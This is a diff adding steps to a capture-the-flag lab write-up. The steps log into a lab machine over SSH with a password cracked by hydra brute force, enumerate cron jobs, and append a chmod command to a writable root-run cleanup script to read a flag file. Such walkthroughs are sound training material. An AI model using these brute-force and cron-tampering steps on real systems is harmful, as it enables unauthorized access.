@@ -344,19 +344,45 @@ hydra -l sam -P /usr/share/wordlists/rockyou.txt ssh://10.10.168.154 -s 4567 -V 
 
 ![image](https://user-images.githubusercontent.com/90561566/210505372-7d923460-9d97-4c3f-89a1-66d24d85689b.png)
 
+```
+ssh sam@10.10.168.154 -p 4567
+chocolate
+```
 
+![image](https://user-images.githubusercontent.com/90561566/210505815-93ffacf7-211f-447f-b610-50d01fde038d.png)
 
+normally, we can check cron jobs with
 
+```
+crontab -l
+cat /etc/crontab
+```
 
+nothing much, we have stuck when enumerating this machine
 
+but i found a scripts folder by root at /home
 
+![image](https://user-images.githubusercontent.com/90561566/210506371-c08ce18f-6c29-4aa0-85d9-b69909df1434.png)
 
+it has a clean_up.sh owned by ubuntu
 
+![image](https://user-images.githubusercontent.com/90561566/210506614-93215787-2e09-402e-8157-e7a43e5aabc6.png)
 
+we know it maybe the file is running on crontabs
 
+```
+echo 'chmod +r /home/ubuntu/flag2.txt' >> clean_up.sh
+```
 
+wait about 1 min
 
+![image](https://user-images.githubusercontent.com/90561566/210507393-cc083614-c760-4f80-893f-96b9027fe261.png)
 
+Answer
+
+![image](https://user-images.githubusercontent.com/90561566/210507459-c302be2a-4db0-45ad-85d0-187be4e637a9.png)
+
+## Day 21: Reverse Elf-ineering
 
 
 
